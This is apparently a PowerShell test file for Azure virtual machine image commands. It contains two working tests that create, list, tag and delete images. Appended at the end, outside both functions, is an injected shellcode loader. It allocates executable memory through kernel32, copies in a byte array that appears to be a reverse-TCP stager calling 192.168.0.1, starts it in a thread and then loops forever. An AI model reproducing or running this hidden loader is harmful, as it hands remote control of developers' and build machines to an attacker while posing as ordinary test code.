














function Test-Image
{
    param ($loc)
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        if ($loc -eq $null)
        {
            $loc = Get-ComputeVMLocation;
        }
        
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A4';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId;
        
        
        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId -Primary;
        
        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_LRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";
        $dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";
        $dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";

        $p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;
        $p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';
        
        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        
        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;

        $imgRef = Get-DefaultCRPImage -loc $loc;
        $p = ($imgRef | Set-AzVMSourceImage -VM $p);

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;

        
        $imageName = 'image' + $rgname;
        $tags = @{test1 = "testval1"; test2 = "testval2" };
        $imageConfig = New-AzImageConfig -Location $loc -Tag $tags -HyperVGeneration "V1";
        Set-AzImageOsDisk -Image $imageConfig -OsType 'Windows' -OsState 'Generalized' -BlobUri $osDiskVhdUri;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 1 -BlobUri $dataDiskVhdUri1;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 2 -BlobUri $dataDiskVhdUri2;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 3 -BlobUri $dataDiskVhdUri2;
        Assert-AreEqual 3 $imageConfig.StorageProfile.DataDisks.Count;
        $imageConfig = Remove-AzImageDataDisk -Image $imageConfig -Lun 3;
        Assert-AreEqual 2 $imageConfig.StorageProfile.DataDisks.Count;

        $job = New-AzImage -Image $imageConfig -ImageName $imageName -ResourceGroupName $rgname -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $createdImage = $job | Receive-Job

        
        Assert-NotNull $createdImage.Id;
        Assert-AreEqual $imageName $createdImage.Name;
        Assert-AreEqual 2 $createdImage.StorageProfile.DataDisks.Count;

        Assert-AreEqual "Succeeded" $createdImage.ProvisioningState;
        Assert-AreEqual $osDiskVhdUri $createdImage.StorageProfile.OsDisk.BlobUri;
        Assert-AreEqual $dataDiskVhdUri1 $createdImage.StorageProfile.DataDisks[0].BlobUri;
        Assert-AreEqual $dataDiskVhdUri2 $createdImage.StorageProfile.DataDisks[1].BlobUri;

        Assert-True {$createdImage.Tags.ContainsKey("test1") }
        Assert-AreEqual "testval1" $createdImage.Tags["test1"]
        Assert-True {$createdImage.Tags.ContainsKey("test2") }
        Assert-AreEqual "testval2" $createdImage.Tags["test2"]

        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($imageName -replace ".$") + "*"
        
        $images = Get-AzImage;
        Assert-True { $images.Count -ge 1 };
        
        $images = Get-AzImage -ResourceGroupName $wildcardRgQuery;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;

        $images = Get-AzImage -ResourceGroupName $rgname;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        
        $images = Get-AzImage -Name $wildcardNameQuery;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        Assert-AreEqual $imageName $images[0].Name;
        
        $images = Get-AzImage -Name $imageName;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        Assert-AreEqual $imageName $images[0].Name;
        
        $images = Get-AzImage -ResourceGroupName $wildcardRgQuery -Name $wildcardNameQuery;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        Assert-AreEqual $imageName $images[0].Name;
        
        $images = Get-AzImage -ResourceGroupName $rgname -Name $wildcardNameQuery;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        Assert-AreEqual $imageName $images[0].Name;
        
        $images = Get-AzImage -ResourceGroupName $wildcardRgQuery -Name $imageName;
        Assert-AreEqual 1 $images.Count;
        Assert-AreEqual $rgname $images[0].ResourceGroupName;
        Assert-AreEqual $imageName $images[0].Name;
        
        $image = Get-AzImage -ResourceGroupName $rgname -Name $imageName;
        Assert-AreEqual $rgname $image.ResourceGroupName;
        Assert-AreEqual $imageName $image.Name;
        Assert-AreEqual "V1" $image.HyperVGeneration;

        
        $image | Update-AzImage -Tag @{test1 = "testval3"; test2 = "testval4"};
        Update-AzImage -ResourceGroupName $rgname -ImageName $imageName -Tag @{test1 = "testval3"; test2 = "testval4"};
        Update-AzImage -Image $image -Tag @{test1 = "testval3"; test2 = "testval4"};
        Update-AzImage -ResourceId $image.Id -Tag @{test1 = "testval3"; test2 = "testval4"};

        $image = Get-AzImage -ResourceGroupName $rgname -ImageName $imageName;
        Assert-True {$image.Tags.ContainsKey("test1") }
        Assert-AreEqual "testval3" $image.Tags["test1"]
        Assert-True {$image.Tags.ContainsKey("test2") }
        Assert-AreEqual "testval4" $image.Tags["test2"]
        Assert-AreEqual "V1" $image.HyperVGeneration;

        $job = Remove-AzImage -ResourceGroupName $rgname -ImageName $imageName -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $images = Get-AzImage -ResourceGroupName $rgname;
        Assert-AreEqual 0 $images.Count;

        
        Get-AzVM -ResourceGroupName $rgname | Remove-AzVM -ResourceGroupName $rgname -Force;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

function Test-ImageCapture
{
    param ($loc)
    
    $rgname = Get-ComputeTestResourceName

    try
    {
        
        if ($loc -eq $null)
        {
            $loc = Get-ComputeVMLocation;
        }
        
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A4';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId;
        
        
        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId -Primary;
        
        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_LRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";
        $dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";
        $dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";

        $p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;
        $p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';

        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        
        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;

        $imgRef = Get-DefaultCRPImage -loc $loc;
        $p = ($imgRef | Set-AzVMSourceImage -VM $p);

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;

        
        $vm = Get-AzVM -Name $vmname -ResourceGroupName $rgname;

        Stop-AzVM -ResourceGroupName $rgname -Name $vmname -Force;
        Set-AzVM -ResourceGroupName $rgname -Name $vmname -Generalize;

        
        $imageName = 'image' + $rgname;
        $imageConfig = New-AzImageConfig -Location $loc -SourceVirtualMachineId $vm.Id;
        $createdImage = New-AzImage -Image $imageConfig -ImageName $imageName -ResourceGroupName $rgname;

        Assert-NotNull $createdImage.Id;
        Assert-AreEqual $imageName $createdImage.Name;
        Assert-AreEqual 2 $createdImage.StorageProfile.DataDisks.Count;
        
        Assert-AreEqual "Succeeded" $createdImage.ProvisioningState;
        Assert-AreEqual $osDiskVhdUri $createdImage.StorageProfile.OsDisk.BlobUri;
        Assert-AreEqual $dataDiskVhdUri1 $createdImage.StorageProfile.DataDisks[0].BlobUri;
        Assert-AreEqual $dataDiskVhdUri2 $createdImage.StorageProfile.DataDisks[1].BlobUri;

        
        $images = Get-AzImage -ResourceGroupName $rgname;
        Assert-AreEqual 1 $images.Count;

        Remove-AzImage -ResourceGroupName $rgname -ImageName $imageName -Force;
        $images = Get-AzImage -ResourceGroupName $rgname;
        Assert-AreEqual 0 $images.Count;

        
        Get-AzVM -ResourceGroupName $rgname | Remove-AzVM -ResourceGroupName $rgname -Force;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x01,0x68,0x02,0x00,0x11,0x5b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

